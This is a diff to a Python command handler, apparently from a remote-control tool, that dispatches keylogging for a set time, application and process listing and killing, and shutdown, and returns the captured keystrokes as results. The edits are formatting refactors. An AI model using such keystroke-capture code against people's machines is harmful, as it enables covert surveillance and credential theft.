@@ -6,7 +6,6 @@ import ScreenShot
 import Power
 import time
 import os
-import pandas
 
 DEFAULT_KEYLOG_TIME = 300
 
@@ -38,29 +37,24 @@ while True:
         if '-t' in cmd:
             keylTime = int(cmd[cmd.index('-t') + 1])
         keylog = keyl.Keylogger(keylTime)
+        print('Capturing...')
         keys = keylog.run()
         print('Finished')
         if '-both' in cmd:
-            for i in keys:
-                print(f'{i}: {keys[i]}')
-                result += f'{i}: {keys[i]}\n'
+            result += keys
             print(f'Log: {keylog.getLog()}')
-            result += f'Log: {keylog.getLog()}'
+            result += f'<br>Log: {keylog.getLog()}'
         elif '-l' in cmd:
             print(f'Log: {keylog.getLog()}')
             result += f'Log: {keylog.getLog()}'
         else:
-            for i in keys:
-                print(f'{i}: {keys[i]}')
-                result += f'{i}: {keys[i]}\n'
-
+            result += keys
 
     elif cmd[0] == 'app':
         if cmd[1] == 'list':
             appList = app.ListApp('-path' in cmd)
-            for i in appList:
-                print(i)
-                result += i + '\n'
+            print('List sent')
+            result += appList
         elif cmd[1] == '-end':
             app.StopApp(cmd[2])
             result = 'Stopped'
@@ -71,9 +65,8 @@ while True:
     elif cmd[0] == 'proc':
         if cmd[1] == 'list':
             procList = proc.ListGet()
-            for i in procList:
-                print(f'{i[0]:<10}{i[1]}')
-                result += f'{i[0]:<10}{i[1]}\n'
+            print(procList)
+            result += procList
 
     elif cmd[0] == 'shutdown':
         Power.shutdown()
